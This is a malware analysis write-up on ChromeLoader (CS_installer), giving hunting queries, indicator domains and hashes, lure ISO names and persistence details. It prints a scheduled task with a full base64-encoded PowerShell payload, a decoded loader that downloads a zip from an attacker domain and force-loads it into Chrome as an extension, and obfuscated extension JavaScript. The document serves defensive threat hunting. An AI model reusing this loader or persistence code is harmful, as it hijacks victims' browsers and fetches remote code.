# Observed malicious IOCs for the CS_installer aka ChromeLoader Malware

### CrowdStrike Query to hunt for ChromeLoader

```
ChromeLoader ScriptContent!=null
| dedup ComputerName
| rex field=ScriptContent "(?<MaliciousDomain>(\$domain = \"[a-z.]*.))"
| table _time ComputerName ScriptContent MaliciousDomain
```

```
CommandLine="*CS_installer.exe*" FilePath="*CdRom*"
| table _time ComputerName CommandLine FilePath SHA256HashData
```

### Date of first occurrence

01-03-2022

### Sample Analysis
https://app.any.run/tasks/bfb74c9f-89d0-4c3b-8c65-233677cdbfc5

### Domains Observed

```
hxxps[://]learnataloukt[.]xyz
hxxps[://]brokenna[.]work
hxxps[://]yflexibilituky[.]co
```

### Malicious ISO

The Naming convention of the ISOs appear to be targeting young adults.  These names consistenly change each infection it seems.

```
Universal Chat Spammer.iso
Roblox Muscle Legends Script _ AutoFarm + More ....iso
[UPDATED] Bee Swarm Simulator Script GUI _ Hack....iso
This_Young_Maidenhead_Family_Now_Makes_15800_..._1.iso
The Sims 4 [w_ ALL DLC] Free Download.iso
How To Install Shaders For Minecraft 1.18.1_1....iso => reported by reddit user remuchiiee
```

https://www.virustotal.com/gui/file/fa52844b5b7fcc0192d0822d0099ea52ed1497134a45a2f06670751ef5b33cd3  
https://www.virustotal.com/gui/file/b43767a9b780ba91cc52954aa741be1bddb0905b492e481aea992bca2a0c6a93
https://www.virustotal.com/gui/file/860c1f6f3393014fd84bd29359b4200027274eb6d97ee1a49b61e038d3336372  
https://www.virustotal.com/gui/file/ad68453553a84e03c70106b7c13a483aa9ff1987621084e22067cb1344f52ab7  
https://www.virustotal.com/gui/file/cd999181de69f01ec686f39ccf9a55131a695c55075d530a44f251a8f41da7c8  

mounted ISO mainly contains:
```
\Device\CdRom0\CS_INSTALLER.EXE
\Device\CdRom0\CS_installer.exe.config
\Device\CdRom0\CS_installer.pdb
\Device\CdRom0\CS_installer.pdb
\Device\CdRom0\Microsoft.Win32.TaskScheduler.dll
```

### CS_installers

https://www.virustotal.com/gui/file/ded20df574b843aaa3c8e977c2040e1498ae17c12924a19868df5b12dee6dfdd  
https://www.virustotal.com/gui/file/5f57a4495b9ab853b9d2ab7d960734645ebe5765e8df3b778d08f86119e1695c  
https://www.virustotal.com/gui/file/187e08fca3ea9edd8340aaf335bd809a9de7a10b2ac14651ba292f478b56d180 
https://www.virustotal.com/gui/file/1dbe5c2feca1706fafc6f767cc16427a2237ab05d95f94b84c287421ec97c224  
https://www.virustotal.com/gui/file/5c07178b0c44ae71310571b78dde5bbc7dc8ff4675c20d44d5b386dfb4725558  

### Observed behavior

```
Reads hostname
HKEY_LOCAL_MACHINE\SYSTEM\CONTROLSET001\CONTROL\COMPUTERNAME\ACTIVECOMPUTERNAME

OS Credential Dumping
DNSCompatibility.exe

Checks Windows Trust Settings
HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\WINTRUST\TRUSTPROVIDERS\SOFTWARE

Reads settings of System Certificates
HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\SYSTEMCERTIFICATES\DISALLOWED\CERTIFICATES\305F8BD17AA2CBC483A4C41B19A39A0C7
5DA39D6

Checks supported languages
HKEY_LOCAL_MACHINE\SYSTEM\CONTROLSET001\CONTROL\NLS\SORTING\VERSIONS

Environmental Variables
HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION

Checks Windows Installation Data
HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION

Enumeration of Software
DNSCompatibility.exe
```

### Scheduled Task

ChromeLoader could be hardcoded into the binary (CS_installer.exe / Setup.exe) or via standard tasks

![alt text](https://github.com/xephora/Threat-Remediation-Scripts/blob/main/Threat-Track/CS_INSTALLER/images/1.PNG)

![alt text](https://github.com/xephora/Threat-Remediation-Scripts/blob/main/Threat-Track/CS_INSTALLER/images/2.PNG)

### Schedule Task locations

Location 1: C:\windows\system32\tasks\ChromeLoader

```
﻿<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2022-01-08T12:48:01.586-05:00</Date>
    <Description>Example task</Description>
    <URI>\ChromeLoader</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2022-01-08T12:49:01.55-05:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>cmd</Command>
      <Arguments>/c start /min "" powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E JABlAHgAdABQAGEAdABoACAAPQAgACIAJAAoACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQApAFwAYwBoAHIAbwBtAGUAIgAKACQAYwBvAG4AZgBQAGEAdABoACAAPQAgACIAJABlAHgAdABQAGEAdABoAFwAYwBvAG4AZgAuAGoAcwAiAAoAJABhAHIAYwBoAGkAdgBlAE4AYQBtAGUAIAA9ACAAIgAkACgAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBACkAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAIgAKACQAdABhAHMAawBOAGEAbQBlACAAPQAgACIAQwBoAHIAbwBtAGUATABvAGEAZABlAHIAIgAKACQAZABvAG0AYQBpAG4AIAA9ACAAIgB5AGYAbABlAHgAaQBiAGkAbABpAHQAdQBrAHkALgBjAG8AIgAKAAoAJABpAHMATwBwAGUAbgAgAD0AIAAwAAoAJABkAGQAIAA9ACAAMAAKACQAdgBlAHIAIAA9ACAAMAAKAAoAKABHAGUAdAAtAFcAbQBpAE8AYgBqAGUAYwB0ACAAVwBpAG4AMwAyAF8AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAdABlAHIAIAAiAG4AYQBtAGUAPQAnAGMAaAByAG8AbQBlAC4AZQB4AGUAJwAiACkAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAEMAbwBtAG0AYQBuAGQATABpAG4AZQAgAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAB7AAoACQBpAGYAKAAkAF8AIAAtAE0AYQB0AGMAaAAgACIAbABvAGEAZAAtAGUAeAB0AGUAbgBzAGkAbwBuACIAKQB7AAoACQAJAGIAcgBlAGEAawAKAAkAfQAKAAoACQAkAGkAcwBPAHAAZQBuACAAPQAgADEACgB9AAoACgBpAGYAKAAkAGkAcwBPAHAAZQBuACkAewAKAAoACQBpAGYAKAAtAG4AbwB0ACgAVABlAHMAdAAtAFAAYQB0AGgAIAAtAFAAYQB0AGgAIAAiACQAZQB4AHQAUABhAHQAaAAiACkAKQB7AAoACgAJAAkAdAByAHkAewAKAAkACQAJAHcAZwBlAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwAkAGQAbwBtAGEAaQBuAC8AYQByAGMAaABpAHYAZQAuAHoAaQBwACIAIAAtAG8AdQB0AGYAaQBsAGUAIAAiACQAYQByAGMAaABpAHYAZQBOAGEAbQBlACIACgAJAAkAfQBjAGEAdABjAGgAewAKAAkACQAJAGIAcgBlAGEAawAKAAkACQB9AAoACgAJAAkARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAALQBMAGkAdABlAHIAYQBsAFAAYQB0AGgAIAAiACQAYQByAGMAaABpAHYAZQBOAGEAbQBlACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgBQAGEAdABoACAAIgAkAGUAeAB0AFAAYQB0AGgAIgAgAC0ARgBvAHIAYwBlAAoACQAJAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgAC0AcABhAHQAaAAgACIAJABhAHIAYwBoAGkAdgBlAE4AYQBtAGUAIgAgAC0ARgBvAHIAYwBlAAoACgAJAH0ACgAJAGUAbABzAGUAewAKAAoACQAJAHQAcgB5AHsACgAJAAkACQBpAGYAIAAoAFQAZQBzAHQALQBQAGEAdABoACAALQBQAGEAdABoACAAIgAkAGMAbwBuAGYAUABhAHQAaAAiACkACgAJAAkACQB7AAoACQAJAAkACQAkAGMAbwBuAGYAIAA9ACAARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJABjAG8AbgBmAFAAYQB0AGgACgAJAAkACQAJACQAYwBvAG4AZgAuAFMAcABsAGkAdAAoACIAOwAiACkAIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0ACAAewAKAAkACQAJAAkACQBpAGYAIAAoACQAXwAgAC0ATQBhAHQAYwBoACAAIgBkAGQAIgApAAoACQAJAAkACQAJAHsACgAJAAkACQAJAAkACQAkAGQAZAAgAD0AIAAkAF8ALgBTAHAAbABpAHQAKAAnACIAJwApAFsAMQBdAAoACQAJAAkACQAJAH0AZQBsAHMAZQBpAGYAIAAoACQAXwAgAC0ATQBhAHQAYwBoACAAIgBFAHgAdABlAG4AcwBpAG8AbgBWAGUAcgBzAGkAbwBuACIAKQAKAAkACQAJAAkACQB7AAoACQAJAAkACQAJAAkAJAB2AGUAcgAgAD0AIAAkAF8ALgBTAHAAbABpAHQAKAAnACIAJwApAFsAMQBdAAoACQAJAAkACQAJAH0ACgAJAAkACQAJAH0ACgAJAAkACQB9AAoACQAJAH0AYwBhAHQAYwBoAHsAfQAKAAoACQAJAGkAZgAgACgAJABkAGQAIAAtAGEAbgBkACAAJAB2AGUAcgApAHsACgAKAAoACQAJAAkAdAByAHkAewAKAAoACQAJAAkACQAkAHUAbgAgAD0AIAB3AGcAZQB0ACAAIgBoAHQAdABwAHMAOgAvAC8AJABkAG8AbQBhAGkAbgAvAHUAbgA/AGQAaQBkAD0AJABkAGQAJgB2AGUAcgA9ACQAdgBlAHIAIgAKAAoACQAJAAkACQBpAGYAKAAkAHUAbgAgAC0ATQBhAHQAYwBoACAAIgAkAGQAZAAiACkAewAKAAkACQAJAAkACQBVAG4AcgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AVABhAHMAawBOAGEAbQBlACAAIgAkAHQAYQBzAGsATgBhAG0AZQAiACAALQBDAG8AbgBmAGkAcgBtADoAJABmAGEAbABzAGUACgAJAAkACQAJAAkAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBwAGEAdABoACAAIgAkAGUAeAB0AFAAYQB0AGgAIgAgAC0ARgBvAHIAYwBlACAALQBSAGUAYwB1AHIAcwBlAAoACQAJAAkACQB9AAoACgAJAAkACQB9AGMAYQB0AGMAaAB7AH0ACgAKAAkACQAJAHQAcgB5AHsACgAJAAkACQAJAHcAZwBlAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwAkAGQAbwBtAGEAaQBuAC8AYQByAGMAaABpAHYAZQAuAHoAaQBwAD8AZABpAGQAPQAkAGQAZAAmAHYAZQByAD0AJAB2AGUAcgAiAC
```

Location 2: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\TREE\ChromeLoader

```
Property   Type Value                                                                                                                                 
--------   ---- -----                                                                                                                                 
SD       Binary (0x)01,00,04,80,94,00,00,00,b0,00,00,00,00,00,00,00,14,00,00,00,02,00,80,00,04,00,00,00,00,10,18,00,9f,01,1f,00,01,02,00,00,00,00,00,0
                5,20,00,00,00,20,02,00,00,00,10,14,00,9f,01,1f,00,01,01,00,00,00,00,00,05,12,00,00,00,00,10,24,00,ff,01,1f,00,01,05,00,00,00,00,00,05,
                15,00,00,00,79,7b,4c,2a,f0,c4,03,8b,df,0b,88,58,ea,03,00,00,00,00,24,00,89,00,12,00,01,05,00,00,00,00,00,05,15,00,00,00,79,7b,4c,2a,f0
                ,c4,03,8b,df,0b,88,58,ea,03,00,00,00,00,00,00,01,05,00,00,00,00,00,05,15,00,00,00,79,7b,4c,2a,f0,c4,03,8b,df,0b,88,58,ea,03,00,00,01,0
                5,00,00,00,00,00,05,15,00,00,00,79,7b,4c,2a,f0,c4,03,8b,df,0b,88,58,01,02,00,00                                                       
Id       String {95F41003-19E5-4FEF-BC34-BD6B24044329}                                                                                                
Index     DWord 3 
```

### Command of task
```
cmd /c start /min "" powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E <base64EncodedPayload>
```

### Snippet of base64 decoded powershell script

```powershell
$extPath = "$($env:LOCALAPPDATA)\chrome"
$confPath = "$extPath\conf.js"
$archiveName = "$($env:LOCALAPPDATA)\archive.zip"
$taskName = "ChromeLoader"
$domain = "SomeMaliciousDomain"

$isOpen = 0
$dd = 0
$ver = 0

(Get-WmiObject Win32_Process -Filter "name='chrome.exe'") | Select-Object CommandLine | ForEach-Object {
	if($_ -Match "load-extension"){
		break
	}

	$isOpen = 1
}

if($isOpen){

	if(-not(Test-Path -Path "$extPath")){

		try{
			wget "https://$domain/archive.zip" -outfile "$archiveName"
		}catch{
			break
		}

		Expand-Archive -LiteralPath "$archiveName" -DestinationPath "$extPath" -Force
		Remove-Item -path "$archiveName" -Force

	}
	else{

		try{
			if (Test-Path -Path "$confPath")
			{
				$conf = Get-Content -Path $confPath
				$conf.Split(";") | ForEach-Object {
					if ($_ -Match "dd")
					{
						$dd = $_.Split('"')[1]
					}elseif ($_ -Match "ExtensionVersion")
					{
						$ver = $_.Split('"')[1]
					}
				}
			}
		}catch{}

		if ($dd -and $ver){


			try{

				$un = wget "https://$domain/un?did=$dd&ver=$ver"

				if($un -Match "$dd"){
					Unregister-ScheduledTask -TaskName "$taskName" -Confirm:$false
					Remove-Item -path "$extPath" -Force -Recurse
				}

			}catch{}

			try{
				wget "https://$domain/archive.zip?did=$dd&ver=$ver" -outfile "$archiveName"
			}
			catch{}

			if (Test-Path -Path "$archiveName"){
				Expand-Archive -LiteralPath "$archiveName" -DestinationPath "$extPath" -Force
				Remove-Item -path "$archiveName" -Force
			}

		}

	}

	try{
		Get-Process chrome | ForEach-Object { $_.CloseMainWindow() | Out-Null}
		start chrome --load-extension="$extPath", --restore-last-session, --noerrdialogs, --disable-session-crashed-bubble
	}catch{}

}
```

### Dropped Extension location

```
C:\users\<Profile>\appdata\local\chrome
```

### Malicious Extension

```
sha256sum archive.zip
561f219a76e61d113ec002ecc4c42335f072be0f2f23e598f835caba294a3f9b  archive.zip

Contents:
background.js  conf.js  manifest.json  options.png
```

### Sample Extension Configuration
```
cat conf.js

let _ExtnensionName = "Options";
let _ExtensionVersion = "4.0";
let _dd = "MzQ1NDYHAQICAwIGDAEAAgEFAgILBwAMSgoABgYDB0gEAgICAgUHAwAASQ==";
let _ExtDom = "https://krestinaful[.]com/";
let _ExtDomNoSchema = "krestinaful[.]com"
```

### Sample Obfuscated Javascript
```js
cat background.js

T1MM.q3 = (function () {
    var v = 2;
    for (; v !== 9;) {
        switch (v) {
        case 2:
            v = typeof globalThis === 'object' ? 1 : 5;
            break;
        case 1:
            return globalThis;
            break;
        case 5:
            var G;
            try {
                var s = 2;
                for (; s !== 6;) {
                    switch (s) {
                    case 2:
                        Object['defineProperty'](Object['prototype'], 'xbHiy', {
                            'get': function () {
                                var J = 2;
                                for (; J !== 1;) {
                                    switch (J) {
                                    case 2:
                                        return this;
                                        break;
                                    }
                                }
                            },
                            'configurable': true
                        });
                        G = xbHiy;
                        s = 5;
                        break;
                    case 5:
                        G['QQr8M'] = G;
                        s = 4;
                        break;
                    case 4:
                        s = typeof QQr8M === 'undefined' ? 3 : 9;
                        break;
                    case 9:
                        delete G['QQr8M'];
                        var N = Object['prototype'];
                        delete N['xbHiy'];
                        s = 6;
                        break;
                    case 3:
                        throw "";
                        s = 9;
                        break;
                    }
                }
            } catch (l) {
                G = window;
            }
            return G;
            break;
        }
    }
})();
T1MM.A1MM = A1MM;
e7(T1MM.q3);
[TRUNCATION..]
```
